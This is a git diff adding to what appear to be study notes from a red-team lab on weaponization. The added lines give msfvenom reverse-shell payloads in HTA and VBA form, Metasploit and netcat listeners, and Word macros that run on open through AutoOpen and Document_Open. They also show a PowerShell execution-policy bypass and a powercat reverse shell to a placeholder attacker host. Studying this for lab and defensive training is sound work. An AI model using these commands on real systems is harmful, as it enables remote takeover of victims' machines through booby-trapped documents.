@@ -49,7 +49,80 @@ It uses VBScript
 
 - Create a reverse shell with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP-ATTACK-MACHINE LPORT=443 -f hta-psh -o thm.hta`
 - Launch a listener: `nc -lvp 443`
-- Possible to generate and serve HTA with Metasploit framework 
+- The reverse shell is launched when the link is visited from the target machine
+- Possible to generate and serve HTA with Metasploit framework `use exploit/windows/misc/hta_server`and we need to set LHOST, LPORT, SRVHOST, Payload we can use this payload `windows/meterpreter/reverse_tcp`
+- When the link is visited in the target we get a meterpreter shell
+
+## Visual Basic for Application (VBA)
+
+- We need to use Word
+- We open Visual Basic Editor by selecting `view → macros`
+- We can give a name to our macro and click create
+- We then can make another message box
+```
+Sub MACRONAME()
+  MsgBox ("Message in a box")
+End Sub
+```
+- We run the macro with F5
+- To execute it automatically we can use after the document is open we need to use AutoOpen and Document_open
+```
+Sub Document_Open()
+  MACRONAME
+End Sub
+
+Sub AutoOpen()
+  MACRONAME
+End Sub
+
+Sub MACRONAME()
+  MsgBox ("Message in a box")
+End Sub
+```
+- we save the document in docm or doc
+
+### Execute a bin
+
+```
+Sub ExecBin()
+        Dim payload As String
+        payload = "calc.exe"
+        CreateObject("Wscript.Shell").Run payload,0
+End Sub
+```
+
+### Use msfvenom for VBA
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443 -f vba
+```
+
+- We just need to copy the output in the file
+- We set the listener with msfconsole `use exploit/multi/handler` `set payload windows/meterpreter/reverse_tcp` we set also LHOST and LPORT
+- When the doc is open in the target machine we get a shell
+
+## PowerShell
+
+- Write something with powershell we open a text editor and put this inside: `Write-Output "something"`
+- We save the file with .PS1 extension
+- We can execute it from the cmd: `powershell -File thm.ps1`
+
+### Execution policy
+
+- See if we are restricted: `Get-ExecutionPolicy`
+- Change it: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`
+- we can also bypassing when executing the script: `powershell -ex bypass -File script.ps1`
+
+### Getting a reverse shell
+
+- We can use [powercat](https://github.com/besimorhino/powercat)
+- We set up a listener `nc -lvp 443`
+- We launch powercat `powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd"
+- We should get a shell
+ 
+## Command and Control
+
+### TODO`
 
 ## Resources
 
